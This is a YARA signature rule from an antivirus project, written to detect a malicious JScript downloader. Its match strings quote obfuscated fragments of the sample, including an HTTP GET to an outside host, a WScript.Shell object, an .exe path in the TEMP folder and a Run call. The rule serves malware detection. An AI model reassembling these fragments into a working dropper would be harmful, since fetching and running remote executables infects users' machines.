rule sig_20160401_cff4f12b3c1c4b8e6fee15ed318b75f7 {
  meta:
    description = "datamaliciousorder - file 20160401_cff4f12b3c1c4b8e6fee15ed318b75f7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "cb5862928d279365d98669988a055f791611658afa460996ad1d0f8fbdb821b3"

  strings:
    $s1  = "NiBz[YczBbw](\"G\" + \"ET\", \"http://sirplusalot.net/l1pasw\", false);" fullword ascii
    $s2  = "var NwqXj = function BrcOgm() {return WScript[CujKrw](\"WScript\"+\".Shell\");}(), FuaTft = 11;" fullword ascii
    $s3  = "function NdNcg(AmMqs, CugSm){YjOz = YjOz * 1; return AmMqs - CugSm;};" fullword ascii
    $s4  = "if (NiBz[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function OwePeu(){return OkgPst + \"\";};" fullword ascii
    $s6  = "function SqHj() {return NwqXj[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"GGjP2gjw.ex\" + \"e\";};" fullword ascii
    $s7  = "function ZxTq() {return ((MhYd == true) && (MhYd == ApYa)) ? 1 : YjOz;};" fullword ascii
    $s8  = "var ZdiVp = new this[\"Date\"]();" fullword ascii
    $s9  = "MhYd = true; " fullword ascii
    $s10 = "function GbyPeh(JsZb) {var FfFrc = (1, 2, 3, 4, 5, JsZb); return FfFrc;};" fullword ascii
    $s11 = "function KjtWhc(){return CujKrw;};" fullword ascii
    $s12 = "var PqNe = false;" fullword ascii
    $s13 = "}while (YaUg);" fullword ascii
    $s14 = "function KpaBrb(WdsWe){NwqXj[\"R\"+\"un\"](WdsWe, YjOz, YjOz);};" fullword ascii
    $s15 = "function JwpIip()" fullword ascii
    $s16 = "var MhYd = false;" fullword ascii
    $s17 = "var ApYa = false;" fullword ascii
    $s18 = "function OzeYy(){return 23;};" fullword ascii
    $s19 = "return NdNcg(CrvOdy, IiuVxv);" fullword ascii
    $s20 = "ApYa = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}